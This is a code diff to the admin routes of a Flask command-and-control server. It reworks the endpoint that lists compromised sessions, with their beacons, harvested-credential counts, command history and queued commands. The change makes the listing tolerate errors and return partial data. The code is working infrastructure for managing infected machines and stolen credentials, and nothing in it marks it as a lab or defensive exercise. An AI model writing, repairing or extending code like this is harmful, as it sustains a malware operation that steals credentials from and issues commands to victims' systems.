@@ -210,8 +210,6 @@ def submit_results():
 # Admin routes for C2 management
 @c2_bp.route('/c2/sessions', methods=['GET'])
 def list_sessions():
-    """List all active C2 sessions for admin panel"""
-    # Secure this with your existing admin authentication
     if not session.get('cracked_admin_logged_in'):
         return jsonify({"error": "Admin authentication required"}), 401
     
@@ -219,49 +217,54 @@ def list_sessions():
         sessions_list = []
         
         for session_id, data in active_sessions.items():
-            # Get latest system info
-            system_info = db.c2_systems.find_one({"session_id": session_id})
-            
-            # Get beacon count
-            beacon_count = db.c2_beacons.count_documents({"session_id": session_id})
-            
-            # Get credentials count
-            creds_count = db.harvested_credentials.count_documents({"session_id": session_id})
-            
-            # Get command history count
-            cmd_count = db.c2_command_history.count_documents({"session_id": session_id})
-            
-            # Calculate online status (active in last 5 minutes)
-            last_seen = data.get("last_seen")
-            is_online = False
-            last_seen_str = ""
-            
-            if last_seen:
-                time_diff = datetime.utcnow() - last_seen
-                is_online = time_diff.total_seconds() < 300  # 5 minutes
-                last_seen_str = last_seen.isoformat()
-            
-            sessions_list.append({
+            # Create a basic session structure even if data is incomplete
+            session_entry = {
                 "session_id": session_id,
-                "last_seen": last_seen_str,
+                "last_seen": data.get("last_seen", "").isoformat() if isinstance(data.get("last_seen"), datetime) else "",
                 "ip": data.get("ip", "unknown"),
                 "user_agent": data.get("user_agent", "unknown"),
-                "system_info": system_info.get("system_info", {}) if system_info else {},
-                "online": is_online,
-                "beacon_count": beacon_count,
-                "credentials_count": creds_count,
-                "command_count": cmd_count,
-                "pending_commands": len(command_queue.get(session_id, []))
-            })
+                "system_info": {},
+                "online": False,
+                "beacon_count": 0,
+                "credentials_count": 0,
+                "command_count": 0,
+                "pending_commands": 0
+            }
+            
+            # Try to enhance with additional data if available
+            try:
+                system_info = db.c2_systems.find_one({"session_id": session_id})
+                if system_info:
+                    session_entry["system_info"] = system_info.get("system_info", {})
+                
+                session_entry["beacon_count"] = db.c2_beacons.count_documents({"session_id": session_id})
+                session_entry["credentials_count"] = db.harvested_credentials.count_documents({"session_id": session_id})
+                session_entry["command_count"] = db.c2_command_history.count_documents({"session_id": session_id})
+                
+                # Calculate online status
+                if data.get("last_seen"):
+                    time_diff = datetime.utcnow() - data["last_seen"]
+                    session_entry["online"] = time_diff.total_seconds() < 300
+                
+                session_entry["pending_commands"] = len(command_queue.get(session_id, []))
+            except Exception as e:
+                # If any error occurs, log it but still include basic session info
+                current_app.logger.error(f"Error enhancing session data: {str(e)}")
+            
+            sessions_list.append(session_entry)
         
         return jsonify({
             "status": "success",
             "sessions": sessions_list
-        })
-    
+        }), 200
+        
     except Exception as e:
         current_app.logger.error(f"Error listing sessions: {str(e)}")
-        return jsonify({"status": "error", "message": f"Internal error: {str(e)}"}), 500
+        return jsonify({
+            "status": "error",
+            "message": f"Internal error: {str(e)}",
+            "sessions": []
+        }), 200  # Return 200 with empty sessions list
 
 @c2_bp.route('/c2/sessions/<session_id>', methods=['GET'])
 def get_session_details(session_id):
